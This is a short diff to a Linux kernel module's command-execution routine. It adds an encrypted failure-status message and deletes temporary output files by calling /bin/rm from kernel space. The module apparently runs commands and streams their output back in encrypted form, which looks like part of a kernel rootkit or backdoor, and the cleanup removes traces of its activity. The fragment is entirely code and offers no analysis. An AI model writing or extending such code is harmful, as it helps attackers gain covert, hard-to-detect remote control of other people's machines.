@@ -128,7 +128,16 @@ static int execute_and_stream_output(const char *cmd) {
         buf[strcspn(buf, "\n")] = 0;
         send_encrypted_section(buf);
         filp_close(f, NULL);
+    } else {
+        // If we can't read the status file, send failure status
+        send_encrypted_section("-1");
     }
+
+    // Clean up temporary files
+    set_fs(KERNEL_DS);
+    call_usermodehelper("/bin/rm", (char *[]){"/bin/rm", "-f", tmp_stdout, tmp_stderr, tmp_status, NULL}, NULL, UMH_WAIT_PROC);
+    set_fs(old_fs);
+
     send_encrypted_section(EOF_MARKER);
     return 0;
 }
